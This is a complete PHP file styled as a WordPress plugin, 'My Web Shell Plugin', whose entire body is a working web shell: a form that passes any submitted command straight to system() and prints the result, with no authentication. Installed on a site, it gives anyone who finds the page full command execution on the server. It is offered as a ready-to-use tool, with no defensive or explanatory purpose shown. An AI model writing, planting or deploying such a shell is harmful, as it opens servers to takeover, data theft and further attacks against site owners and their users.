<?php
/**
 * Plugin Name: My Web Shell Plugin
 * Plugin URI: https://example.com/my-web-shell-plugin
 * Description: This plugin embeds a web shell in your WordPress installation.
 * Version: 1.0
 * Author: Bard
 */
?>
<form action="" method=post>
Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){print(stripslashes($_POST["c"]));} ?>">
<input type=submit>
</form>
<pre>
<?php if (isset($_POST["c"])){system(stripslashes($_POST["c"])." 2>&1");} ?>
</pre>
